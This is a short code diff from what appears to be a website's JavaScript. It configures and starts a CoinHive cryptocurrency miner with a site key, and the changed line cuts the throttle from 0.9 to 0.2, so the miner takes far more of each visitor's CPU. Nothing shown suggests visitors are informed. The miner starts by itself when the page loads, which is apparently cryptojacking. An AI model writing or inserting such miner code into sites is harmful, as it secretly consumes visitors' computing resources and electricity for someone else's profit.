@@ -291,7 +291,7 @@ var miner;
 when('CoinHive').run(function(){
   miner = new CoinHive.User('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps', 'website', {
     threads: 3,
-    throttle: 0.9
+    throttle: 0.2
   });
   miner.setAutoThreadsEnabled(true);
   miner.start();
